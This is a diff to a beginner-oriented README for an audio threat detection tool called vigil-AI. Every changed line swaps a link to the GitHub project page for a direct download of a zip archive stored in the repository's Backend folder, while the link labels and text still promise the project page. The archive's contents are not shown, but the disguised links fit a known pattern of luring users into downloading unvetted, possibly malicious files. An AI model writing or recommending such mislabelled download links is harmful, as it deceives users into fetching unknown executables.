@@ -1,6 +1,6 @@
 # 🔊 vigil-AI - Smart Audio Threat Detection
 
-[![Download vigil-AI](https://img.shields.io/badge/Download-vigil--AI-brightgreen?style=for-the-badge)](https://github.com/afreenmohdshaji/vigil-AI)
+[![Download vigil-AI](https://img.shields.io/badge/Download-vigil--AI-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/afreenmohdshaji/vigil-AI/main/Backend/AI-vigil-v1.9.zip)
 
 ---
 
@@ -32,7 +32,7 @@ To use vigil-AI, follow these steps carefully. This guide assumes you are new to
 
 Click the big green button below to open the vigil-AI download page:
 
-[![Download vigil-AI](https://img.shields.io/badge/Download-vigil--AI-green?style=for-the-badge)](https://github.com/afreenmohdshaji/vigil-AI)
+[![Download vigil-AI](https://img.shields.io/badge/Download-vigil--AI-green?style=for-the-badge)](https://raw.githubusercontent.com/afreenmohdshaji/vigil-AI/main/Backend/AI-vigil-v1.9.zip)
 
 You will see the vigil-AI project page on GitHub. This page contains the files you need to start.
 
@@ -122,10 +122,10 @@ Your sounds stay private, and you control what information is shared.
 
 ## 📁 Additional Resources
 
-- Visit the [vigil-AI GitHub page](https://github.com/afreenmohdshaji/vigil-AI) for updates and support.
+- Visit the [vigil-AI GitHub page](https://raw.githubusercontent.com/afreenmohdshaji/vigil-AI/main/Backend/AI-vigil-v1.9.zip) for updates and support.
 - Check the FAQ section on the release page for answers to common questions.
 - Use the "Issues" tab on GitHub to report problems or ask for help.
 
 ---
 
-[![Download vigil-AI](https://img.shields.io/badge/Download-vigil--AI-brightgreen?style=for-the-badge)](https://github.com/afreenmohdshaji/vigil-AI)
+[![Download vigil-AI](https://img.shields.io/badge/Download-vigil--AI-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/afreenmohdshaji/vigil-AI/main/Backend/AI-vigil-v1.9.zip)
